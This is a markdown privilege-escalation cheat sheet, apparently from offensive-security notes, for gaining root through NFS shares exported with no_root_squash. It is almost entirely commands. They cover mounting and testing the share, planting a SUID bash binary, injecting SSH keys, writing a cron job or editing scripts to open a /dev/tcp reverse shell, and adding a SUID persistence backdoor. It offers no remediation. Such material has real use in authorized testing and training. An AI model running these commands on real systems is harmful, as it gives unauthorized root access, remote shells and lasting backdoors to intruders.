# Linux Privilege Escalation – NFS no_root_squash

## Purpose

This file provides a focused workflow for exploiting NFS shares configured with `no_root_squash`.

Core rules:

* `no_root_squash` = root on attacker becomes root on target
* This is often an instant root exploit
* Always test after mounting NFS

---

## 0. Identify NFS

```bash
showmount -e <IP>
```

---

## 1. Mount the Share

```bash
mkdir /mnt/nfs
mount -t nfs <IP>:/share /mnt/nfs
```

---

## 2. Test for no_root_squash (CRITICAL)

Create file as root:

```bash
sudo touch /mnt/nfs/testfile
```

Check ownership:

```bash
ls -la /mnt/nfs
```

If file is owned by:

```text
root root
```

→ `no_root_squash` is enabled

---

## 3. Exploit Method 1: SUID Bash (FASTEST)

### On attacker machine:

```bash
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
```

---

### On target:

```bash
/mnt/nfs/bash -p
```

→ root shell

---

## 4. Exploit Method 2: SSH Key Injection

If home directory is mounted:

```bash
mkdir -p /mnt/nfs/.ssh
echo "your_public_key" > /mnt/nfs/.ssh/authorized_keys
```

Then:

```bash
ssh user@<IP>
```

---

## 5. Exploit Method 3: Cron Injection

If cron directory exposed:

```bash
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" > /mnt/nfs/rootjob
```

---

## 6. Exploit Method 4: Modify Existing Scripts

If scripts are present:

```bash
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> script.sh
```

---

## 7. Verify Root

```bash
whoami
```

---

## 8. Persistence

Add SUID binary:

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

---

## 9. Cleanup (Optional)

Remove:

* test files
* uploaded binaries

---

## 10. If Exploit Fails

Check:

* correct mount path
* permissions
* execution context

---

## 11. Mental Model

* NFS share = shared filesystem
* no_root_squash = no privilege restriction
* root = root everywhere

---

## 12. Golden Rules

* Always test root file creation
* Always try SUID bash first
* Do not overcomplicate—this is a direct win
